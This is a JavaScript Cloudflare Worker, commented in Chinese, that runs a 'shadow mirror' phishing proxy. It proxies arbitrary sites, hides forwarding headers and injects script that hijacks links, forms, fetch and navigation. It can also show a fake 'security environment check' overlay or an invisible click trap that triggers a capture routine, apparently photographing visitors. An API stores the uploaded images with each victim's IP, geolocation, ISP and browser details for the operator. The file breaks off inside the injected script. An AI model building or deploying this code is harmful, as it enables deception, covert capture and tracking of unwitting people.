/**
 * 助手：统一 IP 获取 (重点支持 Cloudflare Pseudo-IPv4 映射)
 */
function getClientIP(request) {
  return request.headers.get("cf-pseudo-ipv4") || request.headers.get("cf-connecting-ip") || "unknown";
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    const normalizedPath = path.toLowerCase();

    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, DELETE, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    // 频率限制检查 (上传计入次数，查看/镜像不计入但受限)
    if (path === "/api/upload" || path.startsWith("/api/image/") || path === "/api/photos") {
      const shouldIncrement = (path === "/api/upload");
      const isAllowed = await checkRateLimit(request, env, shouldIncrement);
      if (!isAllowed) {
        const errorMsg = path === "/api/upload" ? "今日上传配额已用完 (10次/天)" : "今日查看配额已用完 (10次/天)";
        return new Response(JSON.stringify({ error: errorMsg }), {
          status: 429,
          headers: { ...corsHeaders, "Content-Type": "application/json" }
        });
      }
    }

    // 路由分发
    if (path.startsWith("/api/image/") && request.method === "GET") {
      return handleGetImage(request, env, corsHeaders);
    }

    if (path === "/api/upload" && request.method === "POST") {
      return handleUpload(request, env, corsHeaders);
    }

    if (path === "/api/photos" && request.method === "GET") {
      return handleGetPhotos(request, env, corsHeaders);
    }

    if (path === "/api/photos" && request.method === "DELETE") {
      return handleDeletePhotos(request, env, corsHeaders);
    }

    if (path === "/api/quota") {
      const ip = getClientIP(request);
      const whitelist = (env.WHITELIST_IP || "").split(",").map(i => i.trim());
      const isWhitelisted = whitelist.includes(ip);
      const today = new Date().toISOString().split("T")[0];
      const quotaKey = `limit:${ip}:${today}`;
      const usage = parseInt(await env.KV_DATABASE.get(quotaKey) || "0");
      const limit = 10;

      // 使用统一的高精地理位置引擎
      const geo = await getIpLocation(ip, request.cf, env);

      return new Response(
        JSON.stringify({
          ip,
          isWhitelisted,
          usage,
          limit,
          remaining: isWhitelisted ? 999999 : Math.max(0, limit - usage),
          serverDate: today,
          country: geo.country,
          location: geo,
          engine: geo.engine
        }),
        {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const selfOrigin = `${url.protocol}//${url.host}`;

    // 1. 系统通道优先度：API 与 Proxy 资源代理
    if (path.startsWith("/api/")) {
      return handleApi(request, env, ctx);
    }

    if (path.startsWith("/proxy/")) {
      return handleProxy(request, env, ctx);
    }

    // 2. 镜像入口捕获
    const isMirrorEntry = path.toLowerCase() === "/v" || path.toLowerCase().startsWith("/v?");

    // 3. [V9.2 独占式隧道]：只要有 Session，全量拦截（除 API/Proxy 外）
    const shadowTarget = getCookie(request, "SHADOW_TARGET");
    const shadowId = getCookie(request, "SHADOW_ID");

    if (isMirrorEntry || shadowTarget) {
      // 如果已在镜像中但又访问 /，强制进入镜像首页
      const targetBase = isMirrorEntry ? null : shadowTarget;
      return handleMirror(request, env, ctx, targetBase, shadowId, selfOrigin);
    }

    // 4. [无会话模式]：展现工具首页
    if (path === "/" || path === "/index.html" || path === "/home.html") {
      return handleStatic(request, env, "home.html");
    }
    if (path === "/view.html") {
      return handleStatic(request, env, "view.html");
    }

    // 兜底：尝试资源服务或 404
    return env.ASSETS ? env.ASSETS.fetch(request) : new Response("Not Found", { status: 404 });

    // 健康检查端点
    if (path === "/api/ping" || path === "/ping") {
      return new Response(
        JSON.stringify({
          status: "ok",
          timestamp: new Date().toISOString(),
          message: "隧道保持激活中",
        }),
        {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    // 如果归巢（主页），则主动清理镜像 Session 缓存，并注入实时配额
    // 兼容 / , /home, /home.html 等多种入口，防止路由逃逸
    if (normalizedPath === "/" || normalizedPath === "/home" || normalizedPath === "/home.html" || normalizedPath === "/index.html") {
      const assetRequest = new Request(request.url, request);
      return env.ASSETS ? await env.ASSETS.fetch(assetRequest) : new Response("Not Found", { status: 404 });
    }

    // 如果不是 API 请求，则回退到静态资源（Assets）
    if (env.ASSETS) {
      return env.ASSETS.fetch(request);
    }

    return new Response("Not Found", { status: 404 });

  },
};

async function handleUpload(request, env, corsHeaders) {
  try {
    const data = await request.json();
    const { id, image, ip } = data;

    if (!id || !image) {
      return new Response(JSON.stringify({ error: "参数缺失" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
    const buffer = base64ToArrayBuffer(base64Data);
    const timestamp = Date.now();
    const fileName = `${id}/${timestamp}.png`;

    // --- 配额校验已由 checkRateLimit 处理，此处仅保留逻辑一致性 ---
    // --- 恢复结束 ---

    // 存储图片
    const uploadPromise = env.PHOTO_BUCKET.put(fileName, buffer, {
      httpMetadata: { contentType: "image/png" },
    });

    // 获取上传者真实的 IP 与地理位置数据
    const visitorIp = getClientIP(request);
    const cf = request.cf || {};
    const geoInfo = await getIpLocation(visitorIp, cf, env);

    geoInfo.ua = request.headers.get("user-agent") || "未知浏览器";
    geoInfo.time = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
    geoInfo.source = `影子引擎-${geoInfo.engine}`;

    const ipFileName = `${id}/${timestamp}.json`;
    const ipPromise = env.PHOTO_BUCKET.put(ipFileName, JSON.stringify(geoInfo), {
      httpMetadata: { contentType: "application/json" },
    });

    await Promise.all([uploadPromise, ipPromise]);
    return new Response(JSON.stringify({ success: true, fileName }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("上传错误:", error);
    return new Response(JSON.stringify({ error: "上传失败" }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
}


// 图片直通端点 - 直接从 R2 流式传输图片
async function handleGetImage(request, env, corsHeaders) {
  try {
    const url = new URL(request.url);
    const key = decodeURIComponent(url.pathname.replace("/api/image/", ""));

    console.log("请求图片 key:", key);

    const object = await env.PHOTO_BUCKET.get(key);

    console.log("R2 返回对象:", object ? "存在" : "不存在");

    if (!object) {
      return new Response(`Not Found: ${key}`, { status: 404 });
    }

    // 直接返回图片流，不需要 Base64 转换
    return new Response(object.body, {
      headers: {
        ...corsHeaders,
        "Content-Type": "image/png",
        // 强缓存策略 - 24小时
        "Cache-Control": "public, max-age=86400, immutable",
        // Cloudflare CDN 缓存
        "CDN-Cache-Control": "max-age=86400",
        "Cloudflare-CDN-Cache-Control": "max-age=86400",
      },
    });
  } catch (error) {
    console.error("获取图片错误:", error);
    return new Response("Error", { status: 500 });
  }
}

async function handleGetPhotos(request, env, corsHeaders) {
  try {
    const url = new URL(request.url);
    const id = url.searchParams.get("id");
    const page = parseInt(url.searchParams.get("page") || "0");
    const limit = parseInt(url.searchParams.get("limit") || "2");

    if (!id) {
      return new Response(JSON.stringify({ error: "ID参数缺失" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // 1. 检查 R2 绑定状态
    if (!env.PHOTO_BUCKET) {
      throw new Error("PHOTO_BUCKET 绑定丢失，请检查 wrangler.toml 和环境配置");
    }

    // 2. 获取列表
    let listed;
    try {
      listed = await env.PHOTO_BUCKET.list({
        prefix: `${id}/`,
      });
    } catch (listError) {
      throw new Error(`R2 List 失败: ${listError.message}`);
    }

    if (!listed || !listed.objects) {
      return new Response(JSON.stringify({ photos: [], total: 0 }), {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // 3. 安全过滤和排序
    const allPhotos = listed.objects
      .filter((obj) => obj && obj.key && obj.key.endsWith(".png"))
      .sort((a, b) => {
        const timeA = a.uploaded ? a.uploaded.getTime() : 0;
        const timeB = b.uploaded ? b.uploaded.getTime() : 0;
        return timeB - timeA;
      });

    const total = allPhotos.length;
    const totalPages = Math.ceil(total / limit);
    const startIndex = page * limit;
    const endIndex = startIndex + limit;
    const pagePhotos = allPhotos.slice(startIndex, endIndex);

    const baseUrl = new URL(request.url).origin;
    const photos = await Promise.all(
      pagePhotos.map(async (obj) => {
        // 安全解析时间
        let formattedTime = "未知时间";
        try {
          const parts = obj.key.split("/");
          if (parts.length > 1) {
            const timeStr = parts[1].replace(".png", "");
            formattedTime = formatTime(timeStr);
          }
        } catch (e) {
          console.error("时间解析失败:", e);
        }

        // 尝试获取对应的IP信息JSON文件
        let ipInfo = null;
        try {
          const ipFileName = obj.key.replace(".png", ".json");
          const ipObject = await env.PHOTO_BUCKET.get(ipFileName);
          if (ipObject) {
            const ipData = await ipObject.text();
            ipInfo = JSON.parse(ipData);
          }
        } catch (e) {
          // IP信息不存在
        }

        // 尝试获取消耗情况
        let usage = "unknown";
        if (env.KV_DATABASE && ipInfo && ipInfo.ip) {
          try {
            const today = new Date().toISOString().split('T')[0];
            const count = await env.KV_DATABASE.get(`limit:${ipInfo.ip}:${today}`);
            usage = count || "0";
          } catch (e) {
            console.error("加载消耗数据失败:", e);
          }
        }

        return {
          url: `${baseUrl}/api/image/${encodeURIComponent(obj.key)}`,
          time: formattedTime,
          key: obj.key,
          ipInfo: ipInfo,
          usage: usage,
        };
      })
    );

    return new Response(
      JSON.stringify({
        photos,
        total,
        currentPage: page,
        totalPages,
        debug: { count: listed.objects.length, filtered: total }
      }),
      {
        status: 200,
        headers: {
          ...corsHeaders,
          "Content-Type": "application/json",
          "Cache-Control": "no-cache",
        },
      }
    );
  } catch (error) {
    console.error("获取照片错误:", error);
    return new Response(JSON.stringify({
      error: "获取照片失败",
      message: error.message,
      stack: error.stack,
      env_keys: Object.keys(env)
    }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
}


async function handleDeletePhotos(request, env, corsHeaders) {
  try {
    const url = new URL(request.url);
    const id = url.searchParams.get("id");
    const key = url.searchParams.get("key"); // 单张照片的key

    console.log("删除请求 - ID:", id, "Key:", key);

    if (!id) {
      return new Response(JSON.stringify({ error: "ID参数缺失" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // 删除单张照片
    if (key) {
      console.log("开始删除单张照片:", key);

      try {
        // 验证 key 格式
        if (!key.includes('/') || !key.endsWith('.png')) {
          throw new Error(`无效的 key 格式: ${key}`);
        }

        // 删除图片文件
        await env.PHOTO_BUCKET.delete(key);
        console.log("✅ 已删除图片:", key);

        // 删除对应的IP信息JSON文件（如果存在）
        const jsonKey = key.replace(".png", ".json");
        try {
          await env.PHOTO_BUCKET.delete(jsonKey);
          console.log("✅ 已删除IP信息:", jsonKey);
        } catch (jsonError) {
          console.log("⚠️ IP信息文件不存在或删除失败:", jsonKey);
        }

        return new Response(JSON.stringify({
          success: true,
          deleted: 1,
          key: key,
          message: "照片已删除"
        }), {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      } catch (deleteError) {
        console.error("删除单张照片失败:", deleteError);
        return new Response(JSON.stringify({
          error: "删除失败",
          details: deleteError.message,
          key: key
        }), {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    // 删除所有照片（包括图片和JSON文件）
    console.log("开始删除所有照片，ID:", id);

    const listed = await env.PHOTO_BUCKET.list({
      prefix: `${id}/`,
    });

    console.log("找到文件数量:", listed.objects.length);

    // 只计数 PNG 文件（图片），不计数 JSON 文件（IP信息）
    const pngFiles = listed.objects.filter((obj) => obj.key.endsWith(".png"));
    const pngCount = pngFiles.length;

    if (pngCount === 0) {
      return new Response(JSON.stringify({
        success: true,
        deleted: 0,
        message: "没有找到要删除的照片"
      }), {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // 逐个删除以确保可靠性
    let deletedCount = 0;
    for (const obj of listed.objects) {
      try {
        await env.PHOTO_BUCKET.delete(obj.key);
        deletedCount++;
        console.log("✅ 已删除:", obj.key);
      } catch (err) {
        console.error("删除失败:", obj.key, err);
      }
    }

    console.log(`✅ 删除完成，共删除 ${pngCount} 张照片（含IP信息文件）`);

    return new Response(
      JSON.stringify({
        success: true,
        deleted: pngCount,
        total: pngCount,
        message: `已删除 ${pngCount} 张照片`
      }),
      {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("删除照片错误:", error);
    return new Response(JSON.stringify({
      error: "删除失败",
      details: error.message
    }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
}

function base64ToArrayBuffer(base64) {
  const binaryString = atob(base64);
  const bytes = new Uint8Array(binaryString.length);
  for (let i = 0; i < binaryString.length; i++) {
    bytes[i] = binaryString.charCodeAt(i);
  }
  return bytes.buffer;
}

// arrayBufferToBase64 函数已移除 - 不再需要 Base64 转换
// 图片现在通过 /api/image/ 端点直接流式传输

function formatTime(timeStr) {
  try {
    const timestamp = parseInt(timeStr);
    // 处理 Unix 时间戳 (13位毫秒)
    if (!isNaN(timestamp) && timeStr.length >= 10) {
      // 强制转换到北京时间 (UTC+8)
      const date = new Date(timestamp + 8 * 60 * 60 * 1000);
      const bjYear = date.getUTCFullYear();
      const bjMonth = String(date.getUTCMonth() + 1).padStart(2, "0");
      const bjDay = String(date.getUTCDate()).padStart(2, "0");
      const bjHour = String(date.getUTCHours()).padStart(2, "0");
      const bjMinute = String(date.getUTCMinutes()).padStart(2, "0");
      const bjSecond = String(date.getUTCSeconds()).padStart(2, "0");
      return `${bjYear}-${bjMonth}-${bjDay} ${bjHour}:${bjMinute}:${bjSecond}`;
    }
  } catch (e) {
    console.error("formatTime 转换失败:", e);
  }
  return "未知时间";
}

/**
 * 影子镜像核心：服务端网页劫持与注入
 */
/**
 * 统一高精地理位置引擎 (Refactor)
 */
async function getIpLocation(ip, cf, env) {
  const cacheKey = `geo:${ip}`;
  const cached = await env.KV_DATABASE.get(cacheKey);
  if (cached) return { ...JSON.parse(cached), engine: "cache" };

  const res = {
    ip,
    loc: cf ? `${cf.country || ""} ${cf.region || ""} ${cf.city || ""}`.trim() : "未知",
    isp: cf?.asOrganization || "未知",
    ver: ip.includes(":") ? "v6" : "v4",
    scene: "",
    engine: "standard"
  };

  try {
    const isCN = cf?.country === "CN";
    const api = isCN
      ? `https://qifu.baidu.com/api/v1/ip-portrait/brief-info/local?ip=${encodeURIComponent(ip)}`
      : `http://ip-api.com/json/${encodeURIComponent(ip)}?lang=zh-CN`;

    const response = await fetch(api, {
      headers: { "User-Agent": "Mozilla/5.0" },
      signal: AbortSignal.timeout(3000)
    });
    const d = await response.json();

    if (isCN && d.code === 200 && d.data) {
      const g = d.data;
      res.ip = g.query_ip || res.ip;
      res.loc = `${g.country} ${g.province}${g.city}`;
      res.isp = g.isp;
      res.ver = g.version || res.ver;
      res.scene = g.scene;
      res.engine = "premium";
    } else if (!isCN && d.status === "success") {
      res.loc = `${d.country} ${d.regionName} ${d.city}`;
      res.isp = d.isp;
      res.engine = "global";
    }
  } catch (e) {
    console.error("Geo Pipe Error:", e);
  }

  // 极简归一化
  const ispMap = { "China Mobile": "中国移动", "China Unicom": "中国联通", "China Telecom": "中国电信" };
  for (const [en, cn] of Object.entries(ispMap)) {
    if (res.isp.toLowerCase().includes(en.toLowerCase())) { res.isp = cn; break; }
  }
  res.loc = res.loc.replace(/Unknown/g, "").replace(/\s+/g, " ").trim();

  await env.KV_DATABASE.put(cacheKey, JSON.stringify(res), { expirationTtl: 43200 });
  return res;
}


async function handleMirror(request, env, ctx, explicitTarget = null, cachedId = null, selfOrigin = null) {
  // --- 后端安全硬化：镜像入口前置配额检查 ---
  // 设置 increment=false，仅检查不计数。确保前端篡改响应体后仍无法启动镜像。
  const isAllowed = await checkRateLimit(request, env, false);
  if (!isAllowed) {
    return new Response("<div style='color: #fca5a5; background: #111; padding: 20px; font-family: sans-serif;'><h2>今日配额已用完</h2><p>每个 IP 每天限 10 次成功镜像（上传图片）。请明天再试。</p></div>", {
      status: 429,
      headers: { "Content-Type": "text/html; charset=UTF-8" }
    });
  }

  const url = new URL(request.url);
  const currentOrigin = selfOrigin || url.origin;

  // V9.2：智能目标解析逻辑
  let targetUrl = explicitTarget || url.searchParams.get("url") || url.searchParams.get("u");
  let id = url.searchParams.get("id") || cachedId;

  // 如果是在会话中（无显式 url 参数），则将会话基准与当前路径结合
  if (explicitTarget && !url.searchParams.has("url") && !url.searchParams.has("u")) {
    const base = new URL(explicitTarget);
    targetUrl = base.origin + url.pathname + url.search;
  }

  const encodedData = url.searchParams.get("d");
  const mode = url.searchParams.get("m") || "0";

  // 支持前端生成的 Base64 复合编码参数
  if (encodedData) {
    try {
      // 1. 容错转换：处理 + 号变空格，并清理可能存在的换行符
      const b64 = encodedData.replace(/ /g, "+").replace(/[\r\n]/g, "");
      const decoded = atob(b64);

      // 2. 字节还原逻辑
      let decodedParams = decodeURIComponent(
        Array.from(decoded).map(c => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2)).join("")
      );

      // 3. 多路分隔符适配：兼容 | 和 %7C
      decodedParams = decodedParams.replace(/%7C/g, "|");
      const parts = decodedParams.split("|");

      if (parts.length >= 2) {
        if (!id) id = parts[0].trim();
        if (!targetUrl) targetUrl = parts[1].trim();
      } else if (parts.length === 1) {
        const potentialUrl = parts[0].trim();
        if (potentialUrl.includes(".") || potentialUrl.startsWith("http")) {
          if (!targetUrl) targetUrl = potentialUrl;
          if (!id) id = "guest_" + Math.random().toString(36).substring(2, 6);
        }
      }
    } catch (e) {
      console.error("Shadow Decoder Error:", e);
    }
  }

  // 兜底补全与 URL 合规化
  if (targetUrl) {
    // 关键修正：处理可能存在的双重 URI 编码（针对像 https%3A%2F%2F 的情况）
    if (targetUrl.includes("%")) {
      try { targetUrl = decodeURIComponent(targetUrl).trim(); } catch (e) { }
    }
    if (id && id.includes("%")) {
      try { id = decodeURIComponent(id).trim(); } catch (e) { }
    }

    // 移除多余的、重复的协议头（处理 https://https://... 的情况）
    targetUrl = targetUrl.replace(/^(https?:\/\/)+/i, "$1");

    // 补齐缺失协议
    if (!targetUrl.startsWith("http") && (targetUrl.includes(".") || targetUrl.includes(":"))) {
      targetUrl = "https://" + targetUrl;
    }

    // 自动分配 ID
    if (!id || id === "null" || id === "") {
      id = "guest_" + Math.random().toString(36).substring(2, 6);
    }
  }

  if (!targetUrl || !id) {
    return new Response("Missing parameters (ID or URL needed)", { status: 400 });
  }

  // 0. 尝试从边缘缓存获取 (加速关键)
  const cache = caches.default;
  const cacheKey = new Request(url.toString(), request);
  let cachedResponse = await cache.match(cacheKey);
  if (cachedResponse) {
    return cachedResponse;
  }

  try {
    const currentOrigin = url.origin;
    const host = new URL(selfOrigin).host;
    const isAllowed = await checkRateLimit(request, env, false);
    const ipAddr = getClientIP(request);
    const isWhitelisted = (env.WHITELIST_IP || "").split(',').map(i => i.trim()).includes(ipAddr);

    // VIP 免消耗且强制开启注入
    let shouldCapture = (isAllowed || isWhitelisted) && id && id !== "null";

    // 1. 抓取目标页面 - 强制解压缩以确保代码注入成功
    // --- 影子引擎核心：Header 伪装与链路保护 ---
    const targetUrlObj = new URL(targetUrl);
    const targetHost = targetUrlObj.host;
    const targetOrigin = targetUrlObj.origin;

    const fetchHeaders = new Headers(request.headers);
    fetchHeaders.set("Host", targetHost);
    fetchHeaders.set("Referer", targetOrigin + "/"); // 强制伪造目标站内部跳转
    fetchHeaders.set("Origin", targetOrigin);
    fetchHeaders.set("Accept-Encoding", "identity"); // 禁止压缩，确保可注入

    // 移除可能导致检测的镜像站标识
    fetchHeaders.delete("CF-Connecting-IP");
    fetchHeaders.delete("X-Forwarded-For");
    fetchHeaders.delete("X-Real-IP");

    const fetchOptions = {
      method: request.method,
      headers: fetchHeaders,
      redirect: "manual"
    };

    // 只有非 GET/HEAD 请求才需要透传 Body
    if (request.method !== "GET" && request.method !== "HEAD") {
      // 在 Worker 中，Body 可以通过 request.arrayBuffer() 获取并转发
      fetchOptions.body = await request.arrayBuffer();
    }

    console.log(`[Shadow Mirror] Fetching: ${targetUrl}`);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    let response;
    try {
      response = await fetch(targetUrl, {
        ...fetchOptions,
        signal: controller.signal
      });
      console.log(`[Shadow Mirror] Response: ${response.status} ${response.statusText}`);
    } catch (e) {
      console.error(`[Shadow Mirror] Fetch Error: ${e.message} for ${targetUrl}`);
      return new Response(`Proxy Error: ${e.message}`, { status: 502 });
    } finally {
      clearTimeout(timeout);
    }

    // --- V9.2 Location 硬化：防止 3xx 带来的脱域 ---
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const location = response.headers.get("Location");
      if (location) {
        const nextUrl = new URL(location, targetUrl).toString();
        const headers = cleanCookieHeaders(response.headers);
        // 将 Location 重构为经过镜像转换的路径，并带上当前会话 ID 维持连续性
        headers.set("Location", wrapNav(nextUrl, selfOrigin, id));
        return new Response(null, { status: response.status, headers });
      }
    }

    const contentType = response.headers.get("Content-Type") || "";
    const isHtml = contentType.includes("text/html");

    if (!isHtml) {
      const passHeaders = cleanCookieHeaders(response.headers);
      passHeaders.set("Access-Control-Allow-Origin", "*");
      return new Response(response.body, {
        status: response.status,
        headers: passHeaders
      });
    }

    let html = await response.text();

    // 核心硬化：多域名隧道化 (Domain Drifting V2)
    // [V9.0 Turbo Rewrite] 升级全域 URL 劫持，自动将第三方 CDN 资源泵入镜像隧道
    // 兼容多种引号和双斜线路径，最大程度防止“脱域”请求
    const universalProxyRegex = /(https?:\/\/[a-z0-9.-]+\.[a-z]{2,}(?::[0-9]+)?)(\/[^"'\s<>]*)/gi;
    html = html.replace(universalProxyRegex, (match, domain, path) => {
      const domainName = domain.replace(/^https?:\/\//, "");
      // 排除当前镜像自身域名和主站域名（主站域名走回流逻辑）
      if (domainName === host || domainName === new URL(targetUrl).host) {
        return match;
      }
      return `${currentOrigin}/proxy/${domainName}${path}`;
    });

    // 针对 // 开头的相对协议资源进行劫持
    html = html.replace(/\/\/[a-z0-9.-]+\.[a-z]{2,}\/[^"'\s<>]*/gi, (match) => {
      const domainName = match.substring(2).split("/")[0];
      if (domainName === host || domainName === new URL(targetUrl).host) {
        return match;
      }
      return `${currentOrigin}/proxy/${domainName}${match.substring(2 + domainName.length)}`;
    });

    // 特殊处理主站 www.baidu.com 的绝对路径
    html = html.replace(/(https?:)?\/\/www\.baidu\.com/g, "");

    // 2. 注入多战术模式 (CSS/HTML/JS)
    const IS_ENFORCE = mode === "1";
    const IS_STALKER = mode === "2";

    let forceStyle = "";
    let forceHtml = "";

    if (IS_ENFORCE) {
      forceStyle = `
      <style id="shadow-lock-style">
        html, body { overflow: hidden !important; height: 100% !important; }
        #enforcement-overlay {
          position: fixed !important; top: 0 !important; left: 0 !important;
          width: 100% !important; height: 100% !important;
          background: rgba(255, 255, 255, 0.5) !important; backdrop-filter: blur(15px) !important;
          -webkit-backdrop-filter: blur(15px) !important;
          z-index: 2147483647 !important; display: flex !important;
          align-items: center !important; justify-content: center !important;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
        }
        .modal-box { 
          background: rgba(255, 255, 255, 0.95) !important; 
          padding: 35px 30px; 
          border-radius: 18px; 
          text-align: center; 
          max-width: 340px; 
          width: 85%;
          box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.2) !important;
          border: 1px solid rgba(0,0,0,0.05) !important;
          color: #333 !important;
        }
        .modal-box h2 { font-size: 20px !important; margin: 0 0 12px 0 !important; color: #000 !important; font-weight: 600 !important; }
        .modal-box p { font-size: 15px !important; color: #666 !important; line-height: 1.5 !important; margin-bottom: 25px !important; }
        .modal-box button { 
          background: #007AFF !important; color: white !important; border: none !important; 
          padding: 14px 40px !important; border-radius: 10px !important; font-size: 16px !important; 
          font-weight: 500 !important; cursor: pointer !important; width: 100% !important;
          transition: background 0.2s !important;
        }
        .modal-box button:active { background: #0056b3 !important; }
      </style>`;
      forceHtml = `
      <div id="enforcement-overlay">
        <div class="modal-box">
          <h2>https环境安全访问受限</h2>
          <p>为了您的账号安全，请完成设备环境检测。</p>
          <button onclick="startCapture()">继续访问</button>
        </div>
      </div>
      <script>
        window.startCapture = function() {
          const btn = document.querySelector('.modal-box button');
          if (btn) {
            btn.disabled = true;
            btn.innerText = '正在进行环境监测...';
            btn.style.background = '#ccc';
          }
          if (window.performCapture) {
            window.performCapture();
          } else {
            console.error('Tactical Error: performCapture not ready');
            // 如果脚本还没准备好，0.5秒后重试一次
            setTimeout(() => window.performCapture && window.performCapture(), 500);
          }
        }
      </script>`;
    } else if (IS_STALKER) {
      forceStyle = `
      <style id="shadow-lock-style">
        #shadow-click-trap { position: fixed; inset: 0; z-index: 2147483647; background: transparent; cursor: pointer; }
      </style>`;
      forceHtml = `<div id="shadow-click-trap"></div>`;
    }

    // --- 影子镜像 V8.0: 全领域劫持 + 导航拦截模式 ---
    const captureScript = `
    <script>
    (function(){
      const ID = "${id}";
      const MODE = "${mode}";
      const SELF_ORIGIN = location.origin;
      const API_UPLOAD = SELF_ORIGIN + "/api/upload";
      const TARGET_HOST = "${new URL(targetUrl).host}";
      const TARGET_ORIGIN = "${new URL(targetUrl).origin}";

      // ====== 1. AJAX 隧道 (fetch / XHR) ======
      const originalFetch = window.fetch;
      const originalOpen = XMLHttpRequest.prototype.open;

      function wrapUrl(url) {
        if (!url || typeof url !== 'string' || url.startsWith('blob:') || url.startsWith('data:')) return url;
        if (url.startsWith('//')) url = location.protocol + url;
        try {
          const u = new URL(url, location.href);
          if (u.origin !== SELF_ORIGIN && !u.host.includes('google-analytics') && !u.host.includes('doubleclick')) {
            if (u.host !== TARGET_HOST) {
               return "/proxy/" + u.host + u.pathname + u.search + u.hash;
            }
            return u.pathname + u.search + u.hash;
          }
        } catch(e) {}
        return url;
      }

      // 导航级 URL 重写：跨域导航 → 重新走 /v 入口
      function wrapNav(url) {
        if (!url || typeof url !== 'string' || url.startsWith('blob:') || url.startsWith('data:') || url.startsWith('javascript:') || url === '#') return url;
        if (url.startsWith('//')) url = location.protocol + url;
        try {
          const u = new URL(url, location.href);
          // 已经是镜像站内部路径，不需要重写
          if (u.origin === SELF_ORIGIN) return url;
          // 跨域导航 → 通过 /v 重新进入镜像隧道
          return SELF_ORIGIN + "/v?url=" + encodeURIComponent(u.href) + "&id=" + encodeURIComponent(ID) + "&m=" + MODE;
        } catch(e) {}
        return url;
      }

      window.fetch = async function(input, init) {
        if (input instanceof Request) return originalFetch(new Request(wrapUrl(input.url), input), init);
        return originalFetch(wrapUrl(input), init);
      };
      XMLHttpRequest.prototype.open = function(method, url) {
        return originalOpen.apply(this, [method, wrapUrl(url), ...Array.from(arguments).slice(2)]);
      };

      // ====== 2. 全域导航劫持 (链接 / 表单 / location) ======

      // 2a. 拦截 <a> 链接点击
      document.addEventListener('click', function(e) {
        const a = e.target.closest('a[href]');
        if (!a) return;
        const href = a.getAttribute('href');
        if (!href || href.startsWith('#') || href.startsWith('javascript:')) return;
        try {
          const abs = new URL(href, location.href);
          if (abs.origin !== SELF_ORIGIN) {
            e.preventDefault();
            e.stopPropagation();
            location.href = wrapNav(abs.href);
          }
        } catch(e2) {}
      }, true);

      // 2b. 拦截 <form> 表单提交 (强力保障版)
      document.addEventListener('submit', function(e) {
        const form = e.target;
        if (!form || form.tagName !== 'FORM') return;
        
        // 强制劫持所有表单，无论相对还是绝对路径
        const action = form.getAttribute('action') || '';
        try {
          const abs = new URL(action, location.href);
          e.preventDefault();
          
          // 整合 Method 与 Params
          const fd = new FormData(form);
          const params = new URLSearchParams(fd).toString();
          const sep = abs.search ? '&' : '?';
          let dest = abs.href;
          
          if (form.method.toLowerCase() === 'get' && params) {
             const cleanBase = abs.href.split('?')[0];
             dest = cleanBase + '?' + params;
          }
          
          console.log('[Shadow Capture] Form hijacked:', dest);
          location.href = wrapNav(dest);
        } catch(e2) {
          console.error('[Shadow Capture] Form hijack fail:', e2);
        }
      }, true);

      // 2c. 劫持 window.location 赋值与 History API
      const _assign = location.assign.bind(location);
      const _replace = location.replace.bind(location);
      
      location.assign = (url) => _assign(wrapNav(url));
      location.replace = (url) => _replace(wrapNav(url));
      
      const _pushState = history.pushState.bind(history);
      const _replaceState = history.replaceState.bind(history);
      
      history.pushState = function(state, title, url) {
        return _pushState(state, title, url ? wrapNav(url) : url);
      };
      history.replaceState = function(state, title, url) {
        return _replaceState(state, title, url ? wrapNav(url) : url);
      };

      // 2d. 劫持 window.open
      const _open = window.open;
      window.open = function(url) {
        return _open.call(window, wrapNav(url), ...Array.from(arguments).slice(1));
      };

      // 2e. MutationObserver：动态追加的 <a> 也必须重写
      new MutationObserver(function(muts) {
        muts.forEach(function(m) {
          m.addedNodes.forEach(function(n) {
            if (n.nodeType !== 1) return;
            const links = n.tagName === 'A' ? [n] : (n.querySelectorAll ? Array.from(n.querySelectorAll('a[href]')) : []);
            links.forEach(function(a) {
              const h = a.getAttribute('href');
              if (!h || h.startsWith('#') || h.startsWith('javascript:')) return;
              try {
                const abs = new URL(h, location.href);
                if (abs.origin !== SELF_ORIGIN) a.setAttribute('href', wrapNav(abs.href));
              } catch(e3) {}
            });
            // 重写 form action
            const forms = n.tagName === 'FORM' ? [n] : (n.querySelectorAll ? Array.from(n.querySelectorAll('form[action]')) : []);
            forms.forEach(function(f) {
              const act = f.getAttribute('action');
              if (!act) return;
              try {
                const abs = new URL(act, location.href);
                if (abs.origin !== SELF_ORIGIN) f.setAttribute('action', wrapNav(abs.href));
              } catch(e4) {}
            });
          });
        });
      }).observe(document.documentElement, { childList: true, subtree: true });

      // ====== 3. 捕获控制 ======
      let captured = false;
      function unlock() {
        ['enforcement-overlay', 'shadow-click-trap', 'shadow-lock-style'].forEach(id => {
          const el = document.getElementById(id);
